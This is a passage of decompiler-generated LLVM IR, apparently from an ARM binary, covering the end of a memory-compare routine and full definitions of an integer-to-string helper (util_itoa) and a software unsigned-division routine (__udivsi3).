  %v0_10788 = phi i32 [ %v3_10764, %bb21 ], [ %v1_10778, %dec_label_pc_10778 ]
  %v9_10788 = icmp eq i32 %v0_10788, %v0_107b03
  br i1 %v9_10788, label %dec_label_pc_107b0.preheader, label %dec_label_pc_10790

dec_label_pc_107b0.preheader:                     ; preds = %dec_label_pc_10788
  %v2_107b05 = icmp eq i32 %v0_107b03, 0
  br i1 %v2_107b05, label %dec_label_pc_107b8, label %dec_label_pc_10798

dec_label_pc_10790:                               ; preds = %dec_label_pc_10798, %dec_label_pc_10788
  ret i32 0

dec_label_pc_10798:                               ; preds = %dec_label_pc_107a8, %dec_label_pc_107b0.preheader
  %v0_107b0.in = phi i32 [ %v0_107b0, %dec_label_pc_107a8 ], [ %v0_107b03, %dec_label_pc_107b0.preheader ]
  %v0_107ac = phi i32 [ %v1_107ac, %dec_label_pc_107a8 ], [ %arg2, %dec_label_pc_107b0.preheader ]
  %v0_107a8 = phi i32 [ %v1_107a8, %dec_label_pc_107a8 ], [ %tmp, %dec_label_pc_107b0.preheader ]
  %v0_107b0 = add i32 %v0_107b0.in, -1
  %v1_10798 = inttoptr i32 %v0_107a8 to i8*
  %v2_10798 = load i8, i8* %v1_10798, align 1
  %v3_10798 = zext i8 %v2_10798 to i32
  store i32 %v3_10798, i32* @r2, align 4
  %v1_1079c = inttoptr i32 %v0_107ac to i8*
  %v2_1079c = load i8, i8* %v1_1079c, align 1
  %v3_1079c = zext i8 %v2_1079c to i32
  store i32 %v3_1079c, i32* @r3, align 4
  %v9_107a0 = icmp eq i8 %v2_10798, %v2_1079c
  br i1 %v9_107a0, label %dec_label_pc_107a8, label %dec_label_pc_10790

dec_label_pc_107a8:                               ; preds = %dec_label_pc_10798
  %v1_107a8 = add i32 %v0_107a8, 1
  %v1_107ac = add i32 %v0_107ac, 1
  %v2_107b0 = icmp eq i32 %v0_107b0, 0
  br i1 %v2_107b0, label %dec_label_pc_107b8, label %dec_label_pc_10798

dec_label_pc_107b8:                               ; preds = %dec_label_pc_107a8, %dec_label_pc_107b0.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10778, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10740, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_107c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_107c4, i32* %r8.global-to-local, align 4
  %v2_107c4 = icmp eq i32 %v0_107c4, 0
  store i1 %v2_107c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_107c4, label %dec_label_pc_108a4, label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %entry
  %v3_107d4 = icmp eq i8 %arg1, 0
  store i1 %v3_107d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_107d4, label %.thread, label %dec_label_pc_107e8

.thread:                                          ; preds = %dec_label_pc_107d4
  %v4_107dc = inttoptr i32 %v0_107c4 to i8*
  store i8 48, i8* %v4_107dc, align 1
  %v0_107e0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_107e0.pr.pr, label %.thread1, label %dec_label_pc_107e8

.thread1:                                         ; preds = %.thread
  %v4_107e0 = load i32, i32* %r8.global-to-local, align 4
  %v5_107e0 = add i32 %v4_107e0, 1
  %v6_107e0 = inttoptr i32 %v5_107e0 to i8*
  store i8 0, i8* %v6_107e0, align 1
  %v0_107e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_107e4.pr.pr, label %dec_label_pc_108a4, label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %dec_label_pc_107d4, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_107ec = icmp eq i32 %arg2, 10
  store i1 %v7_107ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107ec, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_107e8
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_107e8
  %v4_107e8 = zext i1 %tmp48 to i32
  store i32 %v4_107e8, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_1080c8 = sub nsw i32 0, %tmp
  %tmp.v3_1080c8 = select i1 %phitmp, i32 %tmp, i32 %v3_1080c8
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_1080c8, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_10818 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_10818, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1081c

dec_label_pc_1081c:                               ; preds = %bb46, %.thread6
  %v2_1083c = phi i32 [ %v1_10848, %bb46 ], [ 32, %.thread6 ]
  %v0_10830 = phi i32 [ %v2_10840, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_10820 = load i32, i32* %r6.global-to-local, align 4
  %v3_10824 = urem i32 %v0_10830, %v0_10820
  store i32 %v3_10824, i32* %r1.global-to-local, align 4
  %v7_10828 = icmp eq i32 %v3_10824, 9
  store i1 %v7_10828, i1* %cpsr_z.global-to-local, align 1
  %v1_1082c = add i32 %v3_10824, 48
  store i32 %v0_10830, i32* %r0.global-to-local, align 4
  %v7_10834 = icmp sgt i32 %v3_10824, 9
  %extract.t = trunc i32 %v1_1082c to i8
  br i1 %v7_10834, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1081c
  %v9_10834 = add i32 %v3_10824, 55
  %extract.t28 = trunc i32 %v9_10834 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1081c, %bb45
  %v0_1083c.off0 = phi i8 [ %extract.t, %dec_label_pc_1081c ], [ %extract.t28, %bb45 ]
  store i32 %v0_10820, i32* %r1.global-to-local, align 4
  %v3_1083c = load i32, i32* %r7.global-to-local, align 4
  %v4_1083c = add i32 %v3_1083c, %v2_1083c
  %v5_1083c = inttoptr i32 %v4_1083c to i8*
  store i8 %v0_1083c.off0, i8* %v5_1083c, align 1
  %v0_10840 = load i32, i32* %r0.global-to-local, align 4
  %v1_10840 = load i32, i32* %r1.global-to-local, align 4
  %v2_10840 = udiv i32 %v0_10840, %v1_10840
  store i32 %v2_10840, i32* %r0.global-to-local, align 4
  %v2_10844 = icmp ugt i32 %v1_10840, %v0_10840
  store i1 %v2_10844, i1* %cpsr_z.global-to-local, align 1
  %v0_10848 = load i32, i32* %r5.global-to-local, align 4
  %v1_10848 = add i32 %v0_10848, -1
  store i32 %v1_10848, i32* %r5.global-to-local, align 4
  br i1 %v2_10844, label %dec_label_pc_10850, label %dec_label_pc_1081c

dec_label_pc_10850:                               ; preds = %bb46
  %v0_10850 = load i32, i32* %sl.global-to-local, align 4
  %v2_10850 = icmp eq i32 %v0_10850, 0
  store i1 %v2_10850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10850, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10850
  %v3_10854 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10858 = add i32 %v1_10848, %v3_10854
  store i32 %v3_10858, i32* %r2.global-to-local, align 4
  %v4_10860 = add i32 %v3_10858, -34
  %v5_10860 = inttoptr i32 %v4_10860 to i8*
  store i8 45, i8* %v5_10860, align 1
  %v0_10864.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10864.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10864.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10850
  %v1_10864 = phi i32 [ %v1_10848, %dec_label_pc_10850 ], [ %v1_10864.pre, %.thread11 ]
  %v2_10864 = add i32 %v1_10864, 1
  store i32 %v2_10864, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10870 = phi i32 [ %v2_10864, %.thread12 ], [ %v1_10864.pre, %.thread11 ]
  %v0_10868 = load i32, i32* %r7.global-to-local, align 4
  %v2_10868 = add i32 %v0_10868, %v1_10870
  %v3_10868 = inttoptr i32 %v2_10868 to i8*
  %v4_10868 = load i8, i8* %v3_10868, align 1
  %v6_10868 = zext i8 %v4_10868 to i32
  %v2_1086c = icmp eq i8 %v4_10868, 0
  store i1 %v2_1086c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10868, i32* %r2.global-to-local, align 4
  br i1 %v2_1086c, label %dec_label_pc_108b4, label %dec_label_pc_1087c.preheader

dec_label_pc_1087c.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_1087c.preheader, %dec_label_pc_1087c
  %v0_1087c = phi i32 [ 0, %dec_label_pc_1087c.preheader ], [ %v1_1087c, %dec_label_pc_1087c ]
  %v1_1087c = add i32 %v0_1087c, 1
  store i32 %v1_1087c, i32* %r1.global-to-local, align 4
  %v2_10880 = add i32 %v1_1087c, %v2_10868
  %v3_10880 = inttoptr i32 %v2_10880 to i8*
  %v4_10880 = load i8, i8* %v3_10880, align 1
  %v2_10884 = icmp eq i8 %v4_10880, 0
  store i1 %v2_10884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10884, label %dec_label_pc_1088c, label %dec_label_pc_1087c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_1087c, %dec_label_pc_108b4
  %v0_1089025 = phi i32 [ %v6_10868, %dec_label_pc_108b4 ], [ %v1_1087c, %dec_label_pc_1087c ]
  %v0_1088c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1088c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %dec_label_pc_10890.dec_label_pc_10890_crit_edge, %dec_label_pc_1088c
  %v2_1089c = phi i32 [ %v5_1089c, %dec_label_pc_10890.dec_label_pc_10890_crit_edge ], [ %v0_1088c, %dec_label_pc_1088c ]
  %v0_10894 = phi i32 [ %v0_10894.pre, %dec_label_pc_10890.dec_label_pc_10890_crit_edge ], [ %v2_10868, %dec_label_pc_1088c ]
  %v0_10890 = phi i32 [ %v0_10890.pre, %dec_label_pc_10890.dec_label_pc_10890_crit_edge ], [ %v0_1089025, %dec_label_pc_1088c ]
  %v1_10890 = add i32 %v0_10890, -1
  store i32 %v1_10890, i32* %r1.global-to-local, align 4
  %v1_10894 = inttoptr i32 %v0_10894 to i8*
  %v2_10894 = load i8, i8* %v1_10894, align 1
  %v5_10894 = add i32 %v0_10894, 1
  store i32 %v5_10894, i32* %r2.global-to-local, align 4
  %v3_10898 = icmp eq i32 %v0_10890, 0
  store i1 %v3_10898, i1* %cpsr_z.global-to-local, align 1
  %v3_1089c = inttoptr i32 %v2_1089c to i8*
  store i8 %v2_10894, i8* %v3_1089c, align 1
  %v4_1089c = load i32, i32* %r0.global-to-local, align 4
  %v5_1089c = add i32 %v4_1089c, 1
  store i32 %v5_1089c, i32* %r0.global-to-local, align 4
  br i1 %v3_10898, label %dec_label_pc_108a4, label %dec_label_pc_10890.dec_label_pc_10890_crit_edge

dec_label_pc_10890.dec_label_pc_10890_crit_edge:  ; preds = %dec_label_pc_10890
  %v0_10890.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10894.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10890

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10890, %.thread1, %entry
  %v0_108a4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_108a4, i32* %r0.global-to-local, align 4
  ret i32 %v0_108a4

dec_label_pc_108b4:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10868, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1088c

; uselistorder directives
  uselistorder i32 %v5_1089c, { 1, 0 }
  uselistorder i1 %v3_10898, { 1, 0 }
  uselistorder i32 %v0_10894, { 1, 0 }
  uselistorder i32 %v1_1087c, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10868, { 1, 0 }
  uselistorder i32 %v2_10868, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10864.pre, { 1, 0 }
  uselistorder i32 %v1_10848, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10840, { 1, 0 }
  uselistorder i32 %v3_10824, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_107c4, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 10, 9, 11, 12 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1088c, { 1, 0 }
  uselistorder label %dec_label_pc_1087c, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_107e8, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_108bc = load i32, i32* @r1, align 4
  %v1_108bc = add i32 %v0_108bc, -1
  store i32 %v1_108bc, i32* %r2.global-to-local, align 4
  %v2_108bc = icmp eq i32 %v0_108bc, 0
  %v7_108bc = icmp eq i32 %v0_108bc, 1
  %v0_108c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_108bc, i32 %v0_108c0)
  br i1 %v2_108bc, label %dec_label_pc_109a4, label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %entry
  %v0_108c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_108c8 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_108c8, %v1_108c8
  br i1 %tmp, label %dec_label_pc_108d0, label %dec_label_pc_1095c

dec_label_pc_108d0:                               ; preds = %dec_label_pc_108c8
  %v1_108d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_108d0 = and i32 %v1_108d0, %v1_108c8
  %v4_108d0 = icmp eq i32 %v2_108d0, 0
  br i1 %v4_108d0, label %dec_label_pc_10968, label %dec_label_pc_108d8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_108d0
  %v3_108d8 = icmp ult i32 %v1_108c8, 536870912
  br i1 %v3_108d8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_108d8
  %v4_108dc = mul i32 %v1_108c8, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_108d8, %.thread
  %v0_108fc.pr36.ph = phi i32 [ %v4_108dc, %.thread ], [ %v1_108c8, %dec_label_pc_108d8 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_108d8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_108fc.pr36 = phi i32 [ %v4_108f0, %bb81 ], [ %v0_108fc.pr36.ph, %.preheader.preheader ]
  %v1_108f4 = phi i32 [ %v4_108f4, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_108e8 = icmp ugt i32 %v0_108fc.pr36, 268435455
  br i1 %v2_108e8, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_108fcthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_108ec = icmp ult i32 %v0_108fc.pr36, %v0_108c8
  br i1 %v4_108ec, label %bb80, label %dec_label_pc_108fcthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_108f0 = and i32 %v0_108fc.pr36, 268435456
  %v3_108f0 = icmp eq i32 %v2_108f0, 0
  %v4_108f0 = mul i32 %v0_108fc.pr36, 16
  br i1 %v3_108f0, label %bb81, label %dec_label_pc_108fc.loopexit

bb81:                                             ; preds = %bb80
  %v2_108f4 = and i32 %v1_108f4, 268435456
  %v3_108f4 = icmp eq i32 %v2_108f4, 0
  %v4_108f4 = mul i32 %v1_108f4, 16
  br i1 %v3_108f4, label %.preheader, label %dec_label_pc_108fcthread-pre-split.loopexit.loopexit

dec_label_pc_108fcthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1090848.ph = phi i32 [ %v1_108f4, %bb ], [ %v4_108f4, %bb81 ]
  %v0_108fc.pr38.ph = phi i32 [ %v0_108fc.pr36, %bb ], [ %v4_108f0, %bb81 ]
  br label %dec_label_pc_108fcthread-pre-split.loopexit

dec_label_pc_108fcthread-pre-split.loopexit:      ; preds = %dec_label_pc_108fcthread-pre-split.loopexit.loopexit, %.thread2
  %v1_1090848 = phi i32 [ %v1_108f4, %.thread2 ], [ %v1_1090848.ph, %dec_label_pc_108fcthread-pre-split.loopexit.loopexit ]
  %v0_108fc.pr38 = phi i32 [ %v0_108fc.pr36, %.thread2 ], [ %v0_108fc.pr38.ph, %dec_label_pc_108fcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_108fcthread-pre-split

dec_label_pc_108fcthread-pre-split:               ; preds = %dec_label_pc_108fcthread-pre-split.loopexit, %bb83
  %v1_1090846 = phi i32 [ %v1_1090848, %dec_label_pc_108fcthread-pre-split.loopexit ], [ %v3_10908, %bb83 ]
  %v0_108fc.pr = phi i32 [ %v0_108fc.pr38, %dec_label_pc_108fcthread-pre-split.loopexit ], [ %v3_10904, %bb83 ]
  br label %dec_label_pc_108fc

dec_label_pc_108fc.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108fc.loopexit, %dec_label_pc_108fcthread-pre-split
  %v1_10908 = phi i32 [ %v1_1090846, %dec_label_pc_108fcthread-pre-split ], [ %v1_108f4, %dec_label_pc_108fc.loopexit ]
  %v1_10904 = phi i32 [ %v0_108fc.pr, %dec_label_pc_108fcthread-pre-split ], [ %v4_108f0, %dec_label_pc_108fc.loopexit ]
  %v2_108fc = icmp slt i32 %v1_10904, 0
  br i1 %v2_108fc, label %dec_label_pc_10910, label %bb82

bb82:                                             ; preds = %dec_label_pc_108fc
  %v4_10900 = icmp ult i32 %v1_10904, %v0_108c8
  br i1 %v4_10900, label %bb83, label %dec_label_pc_10910

bb83:                                             ; preds = %bb82
  %v3_10904 = mul i32 %v1_10904, 2
  %v2_10908 = icmp slt i32 %v1_10908, 0
  %v3_10908 = mul i32 %v1_10908, 2
  br i1 %v2_10908, label %dec_label_pc_10910, label %dec_label_pc_108fcthread-pre-split

dec_label_pc_10910:                               ; preds = %bb82, %dec_label_pc_108fc, %bb83
  %v2_1091c59 = phi i32 [ %v3_10908, %bb83 ], [ %v1_10908, %bb82 ], [ %v1_10908, %dec_label_pc_108fc ]
  %v1_1091451 = phi i32 [ %v3_10904, %bb83 ], [ %v1_10904, %bb82 ], [ %v1_10904, %dec_label_pc_108fc ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10914

dec_label_pc_10914:                               ; preds = %.thread11, %dec_label_pc_10910
  %v1_10948 = phi i32 [ %v4_10948, %.thread11 ], [ %v2_1091c59, %dec_label_pc_10910 ]
  %v1_1091c = phi i32 [ %v0_10954, %.thread11 ], [ 0, %dec_label_pc_10910 ]
  %v1_1094c = phi i32 [ %v4_1094c, %.thread11 ], [ %v1_1091451, %dec_label_pc_10910 ]
  %v1_10918 = phi i32 [ %v0_10944, %.thread11 ], [ %v0_108c8, %dec_label_pc_10910 ]
  %v3_10914 = icmp ult i32 %v1_10918, %v1_1094c
  br i1 %v3_10914, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10914
  %v3_10918 = sub i32 %v1_10918, %v1_1094c
  store i32 %v3_10918, i32* %r0.global-to-local, align 4
  %v3_1091c = or i32 %v1_1091c, %v1_10948
  store i32 %v3_1091c, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10914, %bb84
  %v1_10924 = phi i32 [ %v1_10918, %dec_label_pc_10914 ], [ %v3_10918, %bb84 ]
  %v1_10928 = phi i32 [ %v1_1091c, %dec_label_pc_10914 ], [ %v3_1091c, %bb84 ]
  %v4_10920 = udiv i32 %v1_1094c, 2
  %v6_10920 = icmp ult i32 %v1_10924, %v4_10920
  br i1 %v6_10920, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10924 = urem i32 %v1_1094c, 2
  %v4_10924 = icmp eq i32 %v3_10924, 0
  %v6_10924 = sub i32 %v1_10924, %v4_10920
  store i32 %v6_10924, i32* %r0.global-to-local, align 4
  br i1 %v4_10924, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10928 = udiv i32 %v1_10948, 2
  %v6_10928 = or i32 %v1_10928, %v5_10928
  store i32 %v6_10928, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10930 = phi i32 [ %v6_10924, %bb85 ], [ %v1_10924, %.thread7 ], [ %v6_10924, %bb86 ]
  %v1_10934 = phi i32 [ %v1_10928, %bb85 ], [ %v1_10928, %.thread7 ], [ %v6_10928, %bb86 ]
  %v4_1092c = udiv i32 %v1_1094c, 4
  %v6_1092c = icmp ult i32 %v1_10930, %v4_1092c
  br i1 %v6_1092c, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10930 = and i32 %v1_1094c, 2
  %v4_10930 = icmp eq i32 %v3_10930, 0
  %v6_10930 = sub i32 %v1_10930, %v4_1092c
  store i32 %v6_10930, i32* %r0.global-to-local, align 4
  br i1 %v4_10930, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10934 = udiv i32 %v1_10948, 4
  %v6_10934 = or i32 %v1_10934, %v5_10934
  store i32 %v6_10934, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_1093c = phi i32 [ %v6_10930, %bb87 ], [ %v1_10930, %.thread8 ], [ %v6_10930, %bb88 ]
  %v1_10940 = phi i32 [ %v1_10934, %bb87 ], [ %v1_10934, %.thread8 ], [ %v6_10934, %bb88 ]
  %v4_10938 = udiv i32 %v1_1094c, 8
  %v6_10938 = icmp ult i32 %v1_1093c, %v4_10938
  br i1 %v6_10938, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_1093c = and i32 %v1_1094c, 4
  %v4_1093c = icmp eq i32 %v3_1093c, 0
  %v6_1093c = sub i32 %v1_1093c, %v4_10938
  store i32 %v6_1093c, i32* %r0.global-to-local, align 4
  br i1 %v4_1093c, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10940 = udiv i32 %v1_10948, 8
  %v6_10940 = or i32 %v1_10940, %v5_10940
  store i32 %v6_10940, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10954 = phi i32 [ %v1_10940, %bb89 ], [ %v1_10940, %.thread9 ], [ %v6_10940, %bb90 ]
  %v0_10944 = phi i32 [ %v6_1093c, %bb89 ], [ %v1_1093c, %.thread9 ], [ %v6_1093c, %bb90 ]
  %v2_10944 = icmp eq i32 %v0_10944, 0
  br i1 %v2_10944, label %dec_label_pc_10954, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10948, 16
  br i1 %tmp138, label %dec_label_pc_10954, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10948 = udiv i32 %v1_10948, 16
  %v4_1094c = udiv i32 %v1_1094c, 16
  br label %dec_label_pc_10914

dec_label_pc_10954:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_10954, i32* %r0.global-to-local, align 4
  ret i32 %v0_10954

dec_label_pc_1095c:                               ; preds = %dec_label_pc_108c8
  %v9_108c8 = icmp eq i32 %v0_108c8, %v1_108c8
  %. = zext i1 %v9_108c8 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_10968:                               ; preds = %dec_label_pc_108d0
  %v2_10968 = icmp ugt i32 %v1_108c8, 65535
  br i1 %v2_10968, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10968
  %v2_1096c = and i32 %v1_108c8, 32768
  %v3_1096c = icmp eq i32 %v2_1096c, 0
  %v4_1096c = udiv i32 %v1_108c8, 65536
  br i1 %v3_1096c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10968
  %v0_1097865 = phi i32 [ %v1_108c8, %dec_label_pc_10968 ], [ %v4_1096c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_1097c = phi i32 [ %v0_1097865, %.thread16 ], [ %v4_1096c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10978 = icmp ugt i32 %v1_1097c, 255
  br i1 %v2_10978, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_1097c = and i32 %v1_1097c, 128
  %v3_1097c = icmp eq i32 %v2_1097c, 0
  %v4_1097c = udiv i32 %v1_1097c, 256
  br i1 %v3_1097c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10980 = or i32 %storemerge, 8
  store i32 %v2_10980, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_1098c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10980, %bb98 ]
  %v1_10988 = phi i32 [ %v1_1097c, %bb96 ], [ %v4_1097c, %bb97 ], [ %v4_1097c, %bb98 ]
  %v2_10984 = icmp ugt i32 %v1_10988, 15
  br i1 %v2_10984, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10988 = and i32 %v1_10988, 8
  %v3_10988 = icmp eq i32 %v2_10988, 0
  %v4_10988 = udiv i32 %v1_10988, 16
  br i1 %v3_10988, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1098c = add nsw i32 %v1_1098c, 4
  store i32 %v2_1098c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10994 = phi i32 [ %v1_1098c, %.thread17 ], [ %v1_1098c, %bb99 ], [ %v2_1098c, %bb100 ]
  %v5_10998 = phi i32 [ %v1_10988, %.thread17 ], [ %v4_10988, %bb99 ], [ %v4_10988, %bb100 ]
  %v2_10990 = icmp ugt i32 %v5_10998, 3
  %v7_10990 = icmp eq i32 %v5_10998, 4
  %v2_10994 = xor i1 %v7_10990, true
  %v3_10994 = and i1 %v2_10990, %v2_10994
  br i1 %v3_10994, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10994 = add nsw i32 %v4_10994, 3
  store i32 %v5_10994, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10998 = phi i32 [ %v4_10994, %.thread18 ], [ %v5_10994, %bb101 ]
  %v2_10998 = xor i1 %v2_10990, true
  %v3_10998 = or i1 %v7_10990, %v2_10998
  br i1 %v3_10998, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10998 = udiv i32 %v5_10998, 2
  %v9_10998 = add i32 %v4_10998, %v8_10998
  store i32 %v9_10998, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_1099c = phi i32 [ %v4_10998, %bb102 ], [ %v9_10998, %bb103 ]
  %v6_1099c = lshr i32 %v0_108c8, %v1_1099c
  store i32 %v6_1099c, i32* %r0.global-to-local, align 4
  ret i32 %v6_1099c

dec_label_pc_109a4:                               ; preds = %entry
  %v0_109a8 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10998, { 1, 0 }
  uselistorder i1 %v7_10990, { 1, 0 }
  uselistorder i32 %v4_10988, { 1, 0 }
  uselistorder i32 %v1_10988, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10980, { 1, 0 }
  uselistorder i32 %v4_1097c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
